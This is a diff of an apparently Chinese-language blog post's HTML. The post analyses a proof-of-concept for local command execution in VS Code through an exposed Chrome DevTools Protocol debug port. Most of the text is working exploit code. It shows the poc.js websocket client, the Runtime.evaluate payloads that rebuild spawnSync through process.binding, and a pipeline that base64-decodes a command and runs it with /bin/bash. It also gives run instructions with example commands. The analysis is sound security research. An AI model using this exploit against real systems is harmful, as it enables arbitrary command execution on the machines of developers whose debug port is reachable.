+</span></span><span class="line"><span class="cl">        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:&#39;pipe&#39;,readable:!0,writable:!1},{type:&#39;pipe&#39;,readable:!1,writable:!0},{type:&#39;pipe&#39;,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c&lt;a.stdio.length;c++){var e=a.stdio[c]&amp;&amp;a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&amp;&amp;a.encoding&amp;&amp;a.encoding!==&#39;buffer&#39;)for(c=0;c&lt;b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&amp;&amp;b.output[1],b.stderr=b.output&amp;&amp;b.output[2],b.error&amp;&amp;(b.error= b.error + &#39;spawnSync &#39;+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}`</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[!] Executing: </span><span class="si">${</span><span class="nx">COMMAND</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">id</span><span class="o">:</span> <span class="mi">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawnSync(&#39;/bin/bash&#39;, [&#39;-c&#39;, &#39;echo </span><span class="si">${</span><span class="nx">COMMAND_B64</span><span class="si">}</span><span class="sb"> | base64 -d | /bin/bash&#39;])`</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">socket</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">socket</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// console.log(event)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">socket</span><span class="p">.</span><span class="nx">onclose</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// console.log(event)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">wasClean</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[?] Connection closed cleanly&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[?] Connection died&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">socket</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>执行命令是<code>node poc.js [HOST] [PORT] [CMD]</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sh" data-lang="sh">node poc.js 127.0.0.1 <span class="m">13611</span> <span class="s2">&#34;pwd &gt;/tmp/a&#34;</span>
-cat /tmp/a
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">node poc.js 127.0.0.1 <span class="m">13611</span> <span class="s2">&#34;pwd &gt;/tmp/a&#34;</span>
+</span></span><span class="line"><span class="cl">cat /tmp/a
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>我用上面的命令尝试了几次都没有成功往/tmp/a中写入东西，于是开始着手分析poc代码。</p>
 <p>getWsLink函数通过<code>http://127.0.0.1:13611/json</code>拿到webSocketDebuggerUrl。之后这个url被用来进行websocket连接。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">getWsLink</span> <span class="p">()</span> <span class="p">{</span>
-  <span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
-  <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">()</span>
-  <span class="k">return</span> <span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">webSocketDebuggerUrl</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">getWsLink</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">webSocketDebuggerUrl</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>建立连接之后发送了4个数据包，这种数据包的协议是<code>Chrome DevTools Protocol</code>，大致结构是这样的：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-js" data-lang="js"><span class="p">{</span>
-	<span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
-  <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;xxx&#39;</span><span class="p">,</span>
-  <span class="nx">params</span><span class="o">:</span> <span class="p">{}</span> <span class="c1">//可选
-</span><span class="c1"></span><span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;xxx&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">params</span><span class="o">:</span> <span class="p">{}</span> <span class="c1">//可选
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这种协议一般用来调试和优化Chromium, Chrome浏览器，查阅文档可以找到poc中使用的两种method。</p>
 <p><img src="/img/vscode-local-execute/image-20191105132516575.png" alt="image-20191105132516575"></p>
@@ -433,7 +429,7 @@ cat /tmp/a
 <p>之后就需要知道发送的这几个expression里面有什么，把几个包中的expression展开、<a href="https://beautifier.io/">美化</a>之后，可以看地更清晰一些：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -500,78 +496,76 @@ cat /tmp/a
 </span><span class="lnt">65
 </span><span class="lnt">66
 </span><span class="lnt">67
-</span><span class="lnt">68
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-js" data-lang="js"><span class="c1">// id=2
-</span><span class="c1"></span><span class="nx">spawn_sync</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">binding</span><span class="p">(</span><span class="s1">&#39;spawn_sync&#39;</span><span class="p">);</span>
-
-<span class="nx">normalizeSpawnArguments</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//解析参数，c:process, b:args, a:options
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="o">?</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">b</span> <span class="o">=</span> <span class="p">[]),</span> <span class="nx">a</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="p">{}),</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({},</span> <span class="nx">a</span><span class="p">),</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span><span class="p">)</span> <span class="p">{</span>
-        <span class="kr">const</span> <span class="nx">g</span> <span class="o">=</span> <span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">concat</span><span class="p">(</span><span class="nx">b</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">);</span>
-        <span class="k">typeof</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span> <span class="o">?</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span> <span class="o">:</span> <span class="nx">c</span> <span class="o">=</span> <span class="s1">&#39;/bin/sh&#39;</span><span class="p">,</span> <span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="nx">g</span><span class="p">];</span>
-    <span class="p">}</span>
-    <span class="k">typeof</span> <span class="nx">a</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span> <span class="o">?</span> <span class="nx">b</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">argv0</span><span class="p">)</span> <span class="o">:</span> <span class="nx">b</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
-    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">env</span> <span class="o">||</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">;</span>
-    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="p">[];</span>
-    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">f</span> <span class="k">in</span> <span class="nx">d</span><span class="p">)</span> <span class="nx">e</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">f</span> <span class="o">+</span> <span class="s1">&#39;=&#39;</span> <span class="o">+</span> <span class="nx">d</span><span class="p">[</span><span class="nx">f</span><span class="p">]);</span> <span class="c1">//加入环境变量
-</span><span class="c1"></span>    <span class="k">return</span> <span class="p">{</span>
-        <span class="nx">file</span><span class="o">:</span> <span class="nx">c</span><span class="p">,</span>
-        <span class="nx">args</span><span class="o">:</span> <span class="nx">b</span><span class="p">,</span>
-        <span class="nx">options</span><span class="o">:</span> <span class="nx">a</span><span class="p">,</span>
-        <span class="nx">envPairs</span><span class="o">:</span> <span class="nx">e</span>
-    <span class="p">};</span>
-<span class="p">}</span>
-
-<span class="c1">// id=3
-</span><span class="c1"></span><span class="nx">spawnSync</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="c1">//主函数，用来执行命令
-</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">normalizeSpawnArguments</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">arguments</span><span class="p">);</span> 
-    <span class="c1">// arguments是函数的参数，https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments
-</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">options</span><span class="p">;</span>
-    <span class="kd">var</span> <span class="nx">c</span><span class="p">;</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">file</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">args</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">args</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">envPairs</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">envPairs</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span> <span class="o">=</span> <span class="p">[{</span>
-            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
-            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
-            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span>
-        <span class="p">},</span> <span class="p">{</span>
-            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
-            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span>
-            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span>
-        <span class="p">},</span> <span class="p">{</span>
-            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
-            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span>
-            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span>
-        <span class="p">}],</span> <span class="nx">a</span><span class="p">.</span><span class="nx">input</span><span class="p">)</span> <span class="p">{</span>
-        <span class="kd">var</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">util</span><span class="p">.</span><span class="nx">_extend</span><span class="p">({},</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-        <span class="nx">g</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">input</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">for</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">c</span> <span class="o">&lt;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">c</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">input</span><span class="p">;</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nx">e</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
-            <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="nx">util</span><span class="p">.</span><span class="nx">_extend</span><span class="p">({},</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span>
-            <span class="nx">isUint8Array</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">?</span> <span class="nx">f</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">:</span> <span class="nx">f</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="p">);</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">spawn_sync</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span> <span class="o">!==</span> <span class="s1">&#39;buffer&#39;</span><span class="p">)</span>
-        <span class="k">for</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">c</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">c</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span> <span class="k">continue</span><span class="p">;</span>
-            <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="p">);</span>
-        <span class="p">}</span>
-    <span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">stdout</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nx">b</span><span class="p">.</span><span class="nx">stderr</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">+</span> <span class="s1">&#39;spawnSync &#39;</span> <span class="o">+</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">path</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">spawnargs</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">args</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)),</span> <span class="nx">b</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="c1">// 加的辅助调试内容
-</span><span class="c1"></span><span class="kd">function</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>
-<span class="p">}</span>
-<span class="kr">const</span> <span class="nx">COMMAND</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-<span class="kr">const</span> <span class="nx">COMMAND_B64</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">COMMAND</span><span class="p">)</span>
-
-<span class="c1">//id=4
-</span><span class="c1"></span><span class="nx">spawnSync</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="sb">`echo </span><span class="si">${</span><span class="nx">COMMAND_B64</span><span class="si">}</span><span class="sb"> | base64 -d | /bin/bash`</span><span class="p">])</span>
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// id=2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">spawn_sync</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">binding</span><span class="p">(</span><span class="s1">&#39;spawn_sync&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">normalizeSpawnArguments</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//解析参数，c:process, b:args, a:options
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="o">?</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">b</span> <span class="o">=</span> <span class="p">[]),</span> <span class="nx">a</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="p">{}),</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({},</span> <span class="nx">a</span><span class="p">),</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">g</span> <span class="o">=</span> <span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">concat</span><span class="p">(</span><span class="nx">b</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">typeof</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span> <span class="o">?</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span> <span class="o">:</span> <span class="nx">c</span> <span class="o">=</span> <span class="s1">&#39;/bin/sh&#39;</span><span class="p">,</span> <span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="nx">g</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">typeof</span> <span class="nx">a</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span> <span class="o">?</span> <span class="nx">b</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">argv0</span><span class="p">)</span> <span class="o">:</span> <span class="nx">b</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">env</span> <span class="o">||</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">f</span> <span class="k">in</span> <span class="nx">d</span><span class="p">)</span> <span class="nx">e</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">f</span> <span class="o">+</span> <span class="s1">&#39;=&#39;</span> <span class="o">+</span> <span class="nx">d</span><span class="p">[</span><span class="nx">f</span><span class="p">]);</span> <span class="c1">//加入环境变量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">file</span><span class="o">:</span> <span class="nx">c</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">args</span><span class="o">:</span> <span class="nx">b</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">options</span><span class="o">:</span> <span class="nx">a</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">envPairs</span><span class="o">:</span> <span class="nx">e</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// id=3
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">spawnSync</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="c1">//主函数，用来执行命令
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">normalizeSpawnArguments</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">arguments</span><span class="p">);</span> 
